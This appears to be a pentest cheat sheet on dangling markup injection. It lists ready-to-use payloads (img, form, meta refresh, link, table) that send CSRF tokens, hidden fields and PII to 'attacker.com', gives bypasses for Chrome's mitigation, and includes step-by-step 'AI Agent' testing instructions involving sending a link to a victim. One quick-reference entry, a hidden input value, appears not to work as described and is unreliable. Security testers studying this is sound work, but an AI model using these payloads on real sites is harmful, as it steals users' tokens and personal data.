# Dangling Markup Injection

## What

Technique to capture data cross-domain when full XSS is blocked (CSP, input filters). Exploits the browser's attribute parsing — leave a URL attribute unclosed so the browser slurps up subsequent HTML (including secrets) into the request URL.

## Preconditions

- Attacker controls data reflected inside an HTML attribute value
- `>` and `"` are **not** filtered/escaped
- Application makes outbound requests (or attacker controls a retrieval channel)

## Vulnerable Sink Pattern

```html
<input type="text" name="input" value="CONTROLLABLE DATA HERE">
```

## Core Payloads

### 1. `img src` (classic)
```
"><img src='//attacker.com?x=
```
Browser scans forward for closing `'` — everything between the payload and the next `'` in the page (CSRF tokens, emails, etc.) is URL-encoded and sent as the query string.

### 2. `form action` — Chrome bypass
```
"><form action='//attacker.com?x=
```

### 3. `meta refresh`
```
"><meta http-equiv="refresh" content="0;url='//attacker.com?x=
```

### 4. `link` stylesheet
```
"><link rel=stylesheet href='//attacker.com?x=
```

### 5. `table background` — deferred / interaction-based
```
"><table background='//attacker.com?x=
```

## Attributes Usable for Dangling

| Tag | Attribute |
|-----|-----------|
| `img` | `src`, `srcset` |
| `form` | `action` |
| `link` | `href` |
| `meta` | `content` |
| `iframe` | `src` |
| `input` | `formaction` |
| `button` | `formaction` |
| `script` | `src` |
| `object` | `data` |
| `table` | `background` |

## What Gets Captured

Everything from the injection point to the next matching quote (`'` or `"`) in the page:
- CSRF tokens
- Hidden field values
- Auth tokens / nonces
- Email addresses / PII

## Testing Steps (AI Agent)

1. Inject `"><img src='//COLLAB_ID.oastify.com?` into a reflected parameter.
2. Trigger the page (send to victim / click link).
3. Check collaborator/server logs for the exfiltrated query string.
4. URL-decode captured value to extract secrets.

## Bypass: All External Requests Blocked

- Inject payload into a **stored** field that re-renders for other users.
- Use `<form action=...>` — victim's form submission triggers the outbound request.
- Use CSS `@import` or `background-image` — may bypass restrictive `connect-src`.

## Browser Mitigations

| Browser | Mitigation |
|---------|-----------|
| Chrome | Blocks `img src` / resource URLs containing raw `<` or newline — neutralises classic img-based dangling |
| Firefox | No equivalent mitigation (as of 2024) |

**Chrome bypass:** Use `form action` or `meta refresh` — not subject to the same restriction.

## Quick Reference

```
"><img src='//attacker.com?
"><form action='//attacker.com?
"><input name=x type=hidden value='//attacker.com?
"><link rel=stylesheet href='//attacker.com?
"><meta http-equiv=refresh content='0;url=//attacker.com?
```
